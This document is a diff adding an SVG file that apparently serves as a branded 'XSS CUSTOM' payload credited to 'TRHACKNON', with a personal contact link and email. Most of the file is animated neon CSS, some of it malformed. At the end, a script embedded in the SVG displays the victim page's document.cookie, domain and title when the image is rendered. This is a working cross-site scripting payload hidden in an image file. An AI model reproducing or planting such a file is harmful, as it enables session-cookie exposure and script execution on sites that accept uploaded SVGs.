@@ -1,0 +1,437 @@
+<svg fill="none" viewBox="0 0 600 400" width="600" height="400" xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+  <div xmlns="http://www.w3.org/1999/xhtml">
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        color: inherit;
+        text-decoration: none;
+        list-style: none;
+        outline: none;
+        box-sizing: border-box;
+        align-items: center;
+      }
+
+      .body {
+        --color-main: #FF00FF; /* Violet fluo */
+        --color-primary: #FFA500; /* Orange fluo */
+        --color-secondary: #00FF00; /* Vert fluo */
+        --color-background: black; /* Jaune fluo */
+        --color-link-trkn: #00ffff; 
+        --color-link-active: #00ff00;
+
+        height: 400px;
+        width: 100%;
+        text-transform: uppercase;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+
+        background-image: linear-gradient(to right, var(--color-main), var(--color-primary), var(--color-secondary));
+        animation: border 5s linear infinite;
+        background-size: 200% 200%;
+        background-position: 0 0;
+        border: 24px solid;
+        border-color: var(--color-background);
+      }
+
+      .container {
+        background: var(--color-background);
+        height: calc(100% - 10px);
+        width: calc(100% - 10px);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      h1 {
+        font-size: 3.5rem;
+        font-weight: 800;
+        font-family: "Open Sans", sans-serif;
+        text-align: center;
+      }
+      h1 a {
+        display: block;
+      }
+      h1 a span {
+        overflow: hidden;
+        transition: transform 0.25s cubic-bezier(0.5, 0, 0.25, 1.25);
+        display: block;
+      }
+      h1 a span em {
+        display: block;
+      }
+      h1 a span:nth-child(1),
+      h1 a span:nth-child(2),
+      h1 a span:nth-child(3) {
+        animation: intro 1.5s cubic-bezier(0.5, 0, 0.25, 1.3) -1s 1;
+      }
+      h1 a span:nth-child(1) {
+        color: var(--color-main);
+        margin-bottom: 6px;
+      }
+      h1 a span:nth-child(1) em {
+        margin-top: 30px;
+        line-height: 0rem;
+        margin-bottom: -10px;
+      }
+      h1 a span:nth-child(2) {
+        color: var(--color-primary);
+        margin-bottom: 6px;
+      }
+      h1 a span:nth-child(2) em {
+        margin-top: -6px;
+        line-height: 1rem;
+      }
+      h1 a span:nth-child(3) {
+        color: var(--color-secondary);
+      }
+      h1 a span:nth-child(3) em {
+        margin-top: -36px;
+        line-height: 3rem;
+      }
+      h1 a:hover span,
+      h1 a:focus span {
+        transition: transform 0.125s cubic-bezier(0.5, 0, 0.25, 2.5);
+      }
+      h1 a:hover span:nth-child(1),
+      h1 a:focus span:nth-child(1) {
+        transform: translateX(1vw);
+      }
+      h1 a:hover span:nth-child(3),
+      h1 a:focus span:nth-child(3) {
+        transform: translateX(-1vw);
+      }
+
+      .items {
+        margin-top: 24px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+      }
+
+      ul {
+        font-size: 16px;
+        line-height: 26px;
+        color: var(--color-main);
+        font-weight: 700;
+        font-family: "Open Sans", sans-serif;
+      }
+
+      ul li {
+        display: flex;
+        letter-spacing: 0.125vw;
+      }
+
+      ul li a {
+        margin-left: 5px;
+      }
+
+      ul li a {
+        margin-left: 5px;
+        color: #00FF00; 
+      }
+
+      ul li a:hover,
+      ul li a:focus {
+        color: var(--color-link-active);
+      }
+
+      ul li a {
+        color: var(--color-link-trkn);
+      }
+
+      .hi {
+        display: inline-block;
+        transform-origin: 70% 70%;
+        animation: hi 3s linear -2s infinite;
+      }
+
+      .hii {
+        display: inline-block;
+        transform-origin: 70% 70%;
+        animation: hii 2s linear -3s infinite;
+      }
+
+      @keyframes border {
+        0% { background-position: 0 0; }
+        20% { background-position: 100% 0; }
+        40% { background-position: 100% 100%; }
+        60% { background-position: 0 100%; }
+        100% { background-position: 0 0; }
+      }
+
+      @keyframes hi {
+        25% { transform: rotate(0deg); }
+        30% { transform: rotate(15deg); }
+        35% { transform: rotate(0deg); }
+        40% { transform: rotate(15deg); }
+        45% { transform: rotate(0deg); }
+        80% { transform: rotate(0deg); }
+        85% { transform: rotate(15deg); }
+        90% { transform: rotate(0deg); }
+        95% { transform: rotate(15deg); }
+        100% { transform: rotate(0deg); }
+      }
+
+      @keyframes hii {
+        25% { transform: rotate(0deg); }
+        30% { transform: rotate(10deg); }
+        35% { transform: rotate(0deg); }
+        40% { transform: rotate(-10deg); }
+        45% { transform: rotate(0deg); }
+        80% { transform: rotate(10deg); }
+        85% { transform: rotate(0deg); }
+        90% { transform: rotate(-10deg); }
+        95% { transform: rotate(0deg); }
+        100% { transform: rotate(10deg); }
+      }
+
+      @keyframes intro {
+        0%, 75% { transform: translateX(-100vw); }
+        100% { transform: translateX(0); }
+      }
+
+      @keyframes fade {
+        0%, 75% { opacity: 0; }
+        100% { opacity: 1; }
+      }
+
+      @media (prefers-color-scheme: light) {
+        .body {
+      --color-main: #9B5DE5;
+      --color-primary: #ff00ff;
+      --color-secondary: #00BBF9;
+      --color-background: #ffffff;
+      --color-link: #00BBF9;
+      --color-link-trkn: #00ffff; 
+      --color-link-active: #00ff00;
+        }
+      }
+
+      @media (prefers-reduced-motion) {
+        .body {
+          animation: none;
+        }
+
+        .hi {
+          animation: none;
+        }
+
+        ul li {
+          opacity: 1;
+          animation: none;
+          color: #00FF00; 
+        }
+
+        h1 a span:nth-child(1),
+        h1 a span:nth-child(2),
+        h1 a span:nth-child(3){}
+          animation: none;
+        }
+      }
+      .shining {
+        position: relative;
+        display: inline-block;
+        animation: shining 1s ease-in-out infinite;
+      }
+
+      @keyframes shining {
+        0% { transform: scale(1) rotate(0deg); opacity: 1; }
+        25% { transform: scale(1.2) rotate(45deg); opacity: 0; }
+        50% { transform: scale(1) rotate(90deg); opacity: 1; }
+      }
+        75% { transform: scale(1.2) rotate(135deg); opacity: 0; }
+        100% { transform: scale(1) rotate(0deg); opacity: 1; }
+      }
+
+      @keyframes shimmer {
+        0% { background: rgba(255, 255, 255, 0); }
+        40% { background: rgba(255, 255, 255, 0); }
+        50% { background: rgba(255, 255, 255, 0.5); }
+        60% { background: rgba(255, 255, 255, 0); }
+        100% { background: rgba(255, 255, 255, 0); }
+      }
+
+      .shining::after {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        animation: shimmer 2s ease-in-out infinite;
+      }
+
+      @keyframes blink {
+        0% { opacity: 0; }
+        50% { opacity: 1; }
+        100% { opacity: 0; }
+      }
+
+      @keyframes changeColor {
+        0% { color: #FF00FF; } /* Violet */
+        20% { color: #FFA500; } /* Orange */
+        40% { color: #FFFF00; } /* Jaune */
+        60% { color: #00FF00; } /* Vert */
+        80% { color: #0000FF; } /* Bleu */
+        100% { color: #FF00FF; } /* Violet */
+      }
+
+
+      span:nth-child(1) {
+        animation: blink 1s infinite 0.1s alternate;
+      }
+
+      span:nth-child(2) {
+        animation: blink 1s infinite 0.2s alternate;
+      }
+
+      span:nth-child(3) {
+        animation: blink 1s infinite 0.3s alternate;
+      }
+
+      span:nth-child(4) {
+        animation: blink 1s infinite 0.4s alternate;
+      }
+
+      span:nth-child(5) {
+        animation: blink 1s infinite 0.5s alternate;
+      }
+
+      span:nth-child(6) {
+        animation: blink 1s infinite 0.6s alternate;
+      }
+
+      span:nth-child(7) {
+        animation: blink 1s infinite 0.7s alternate;
+      }
+
+      span:nth-child(8) {
+        animation: blink 1s infinite 0.8s alternate;
+      }
+
+      span:nth-child(9) {
+        animation: blink 1s infinite 0.9s alternate;
+      }
+
+      span:nth-child(10) {
+        animation: blink 1s infinite 1s alternate;
+      }
+
+      span:nth-child(1) em {
+        animation: changeColor 5s infinite;
+      }
+
+      span:nth-child(2) em {
+        animation: changeColor 5s infinite 1s;
+      }
+
+      span:nth-child(3) em {
+        animation: changeColor 5s infinite 2s;
+      }
+
+      span:nth-child(4) em {
+        animation: changeColor 5s infinite 3s;
+      }
+
+      span:nth-child(5) em {
+        animation: changeColor 5s infinite 4s;
+      }
+
+      span:nth-child(6) em {
+        animation: changeColor 5s infinite 5s;
+      }
+
+      span:nth-child(7) em {
+        animation: changeColor 5s infinite 6s;
+      }
+
+      span:nth-child(8) em {
+        animation: changeColor 5s infinite 7s;
+      }
+
+      span:nth-child(9) em {
+        animation: changeColor 5s infinite 8s;
+      }
+
+      span:nth-child(10) em {
+        animation: changeColor 5s infinite 9s;
+      }
+      .horizontal-text span {
+        display: inline-block;
+      }
+      img {
+        width: 100px;
+        height: 100px;
+        border-radius: 15px; /* Arrondir les angles */
+        border: 5px solid; /* Ajouter une bordure */
+        border-color: var(--color-main); /* Utiliser une couleur contrastée pour la bordure */
+        animation: border-color-change 3s infinite; /* Ajouter une animation dynamique à la bordure */
+      margin-top: 20px;
+      }
+
+      @keyframes border-color-change {
+        0% {
+          border-color: var(--color-main);
+        }
+        33% {
+          border-color: var(--color-primary);
+        }
+        66% {
+          border-color: var(--color-secondary);
+        }
+        100% {
+          border-color: var(--color-main);
+        }
+      }
+    </style>
+    <div class='body'>
+      <div class='container'>
+        <h1>
+          <a href="https://github.com/tucommenceapousser">
+
+            
+            <span><em>XSS CUSTOM</em></span>
+            <span><em>XSS CUSTOM</em></span>
+            <span><em>XSS CUSTOM</em></span>
+          </a>
+        </h1>
+        <section class='items'>
+          <ul>
+            <li>XSS</li>
+          </ul>
+          <ul>
+            <li>by <a href="https://pragmaticpineapple.com">TRHACKNON</a></li>
+          </ul>
+          <ul>
+            <li><a href="mailto:jeremydiliotti@gmail.com" role="button">
+
+            <div class="horizontal-text">
+              <span class='hi'>🏴</span>
+              <span><em>C</em></span>
+              <span><em>U</em></span>
+              <span><em>S</em></span>
+              <span><em>T</em></span>
+              <span><em>O</em></span>
+              <span><em>M</em></span>
+              <span><em>I</em></span>
+              <span><em>Z</em></span>
+              <span><em>E</em></span>
+              <span><em> </em></span>
+              <span class='hi'>🏴</span>
+
+            </div></a></li>
+          </ul>
+        </section>
+        <img src="https://d.top4top.io/p_3139qp9gw0.jpg" alt="Image" style="width: 100px; height: 100px;" />
+      </div>
+    </div>
+  </div>
+
+    <script>confirm(`XSS_BY\n%F0%9F%8F%B4Choca%F0%9F%8F%B4\n\n%E2%9C%93COOKIE\n${document.cookie}\n%E2%9C%93DOMAIN\n${document.domain}\n%E2%9C%93TITRE\n${document.title}\n`)</script>
+  </foreignObject>
+</svg>
